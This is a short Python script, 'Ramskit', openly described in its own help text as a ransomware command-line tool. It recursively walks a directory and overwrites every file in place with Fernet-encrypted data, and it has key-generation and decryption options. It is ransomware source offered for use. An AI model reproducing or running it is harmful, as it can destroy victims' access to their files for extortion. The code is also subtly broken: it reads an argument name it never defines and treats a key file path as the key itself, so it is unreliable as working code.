#!/usr/bin/python3

""" Copyright (C) 2023 Its-Yayo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>. """    

import os
import sys
import argparse
from cryptography.fernet import Fernet

class Ramskit:
    def __init__(self, key):
        self.key = key
    
    def generate_key(self):
        key = Fernet.generate_key()
        with open('key.txt', 'wb') as f:
            f.write(key)
        return key

    def load_key(self):
        return open('key.txt', 'rb').read()
    
    def encrypt_file(self, items):
        for item in items:
            with open(item, 'rb') as f:
                data = f.read()

            fernet = Fernet(self.key)
            encrypted = fernet.encrypt(data)
            
            with open(item, 'wb') as f:
                f.write(encrypted)

    def decrypt_file(self, items):
        for item in items:
            with open(item, 'rb') as f:
                data = f.read()

            fernet = Fernet(self.key)
            decrypted = fernet.decrypt(data)
            
            with open(item, 'wb') as f:
                f.write(decrypted)       

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
    parser.add_argument('-a', '--action', dest="action", required=True, help='Action to perform [encrypt/decrypt/generate_key]')
    parser.add_argument('-k', '--key', dest="key", help='Key file')
    parser.add_argument('-p', '--path', dest="path", required=True, help='Path to file(s) to encrypt/decrypt')
    args = parser.parse_args()

    action = args.action.lower()
    keyfile = args.keyfile
    path = args.path

    ramskit = Ramskit(keyfile)

    if action == 'encrypt':
        items = []
        for root, _, files in os.walk(path):
            for f in files:
                items.append(os.path.join(root, f))
        ramskit.encrypt_file(items)
    elif action == 'decrypt':
        items = []
        for root, _, files in os.walk(path):
            for f in files:
                items.append(os.path.join(root, f))
        ramskit.decrypt_file(items)
    elif action == 'generate_key':
        print(ramskit.generate_key())
    else:
        raise Exception('Invalid action: ', action)
        sys.exit(1)